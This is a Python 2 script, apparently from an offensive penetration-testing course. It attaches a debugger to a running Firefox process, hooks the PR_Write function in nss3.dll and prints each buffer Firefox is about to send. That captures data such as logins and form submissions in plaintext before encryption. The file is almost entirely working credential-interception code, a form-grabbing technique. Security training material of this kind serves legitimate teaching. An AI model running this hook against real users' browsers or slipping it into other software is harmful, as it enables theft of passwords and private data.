# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

# Download winappdbg   http://winappdbg.sourceforge.net/


from winappdbg import Debug, EventHandler, System, Process
import sys



def PR_Write( event, ra ,arg1 ,arg2, arg3): # this is the call back function 
    
    print  process.read( arg2,1024 ) # read 1 KB of the memory content
    
    # arg 2 is the memory pointer addr for data
    # arg 3 is the size of data 
    # See https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR/Reference/PR_Write


class MyEventHandler( EventHandler ):
    
    def load_dll( self, event ):

        module = event.get_module() # Get the module object
        if module.match_name("nss3.dll"): # If it's nss3.dll ,then 
            pid = event.get_pid()  # Get the process ID
            address = module.resolve( "PR_Write" )  # Get the address of PR_Write
            print '[+] Found  PR_Write  at addr ' + str(address)
            event.debug.hook_function( pid, address, preCB=PR_Write, postCB=None ,paramCount=3,signature=None)
            # Hook the PR_Write function, when we the breakpoint occured, three paramaeters (paramCount=3)
            # should be returned to the call back function (which i also name it to PR_Write)




debug = Debug(MyEventHandler()) # Create a debug object instance


try:
    for ( process, name ) in debug.system.find_processes_by_filename( "firefox.exe" ): # Search for Firefox.exe proces, if found 
        print '[+] Found Firefox PID is ' +  str (process.get_pid()) # Grab the Process ID (PID)
    debug.attach( process.get_pid() ) # Attach to the process.
    debug.loop()
    

finally:
    debug.stop()
